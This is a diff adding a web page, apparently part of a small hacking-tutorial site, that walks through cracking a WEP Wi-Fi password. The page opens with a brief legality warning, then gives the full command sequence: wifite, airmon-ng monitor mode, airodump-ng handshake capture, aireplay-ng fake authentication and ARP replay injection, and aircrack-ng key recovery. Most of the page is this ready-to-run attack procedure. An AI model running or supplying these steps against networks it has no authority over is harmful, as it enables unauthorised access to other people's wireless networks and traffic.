@@ -1,0 +1,100 @@
+﻿@page
+
+<br />
+
+<div class="alert alert-warning" role="alert">
+    <strong>You were advised</strong>: This content may be illigal in your country, and should only be used for testing propose on your own network.
+</div>
+
+<h1>
+    Itens needed:
+</h1>
+
+<ul>
+    <li>
+        Kali linux running as live or installed (cannot be virtual machine)
+    </li>
+    <li>
+        Three terminals
+    </li>
+    <li>
+        Good luck
+    </li>
+</ul>
+
+<h1>
+    Terminal 1:
+</h1>
+
+<p>
+    Make shure you have people connected to the wifi, because we need the handshake between	them.
+    The easy way to do it, is start the wifite and wait for the data to be shown.
+    To run it, just run the command below:
+</p>
+
+<div class="p-1 border border-secondary bg-light">
+    <code>$ wifite</code>
+</div>
+
+<br />
+
+<p>
+    You can try the embedded attack on the wifite, but I never had success with it.
+    I just have tested with success the procedures below.
+    So, now that you got the WEP wi-fi with at least one person connected, we can start:
+</p>
+
+<div class="p-1 border border-secondary bg-light">
+    <code>$ airmon-ng start wlan0</code>
+</div>
+
+<br />
+
+<div class="p-1 border border-secondary bg-light">
+    <code>$ airodump-ng mon0 (memorize mac and channel)</code>
+</div>
+
+<br />
+
+<div class="p-1 border border-secondary bg-light">
+    <code>$ airodump-ng --channel [channel] --bssid [MAC] -w [filename] mon0 (it will generate .cap files)</code>
+</div>
+
+<br />
+
+<p>
+    Once you got the packages with the BSSID with them, you can start trying to get the password.
+    That's why we need people connected to the network.
+</p>
+
+<h1>
+    Terminal 2:
+</h1>
+
+<div class="p-1 border border-secondary bg-light">
+    <code>$ aireplay-ng -1 0 -e [nome_wlan] -a [MAC] -h [meu_MAC] mon0</code>
+</div>
+
+<br />
+
+<div class="p-1 border border-secondary bg-light">
+    <code>$ aireplay-ng -3 -b [MAC] -h [meu_MAC] mon0</code>
+</div>
+
+<br />
+
+<h1>
+    Terminal 3:
+</h1>
+
+<div class="p-1 border border-secondary bg-light">
+    <code>$ aircrack-ng -b [MAC] [nome_arquivo.cap]</code>
+</div>
+
+<br />
+
+<p>
+    In somme command you have to wait ARP to use wireless packages
+</p>
+
+<br />
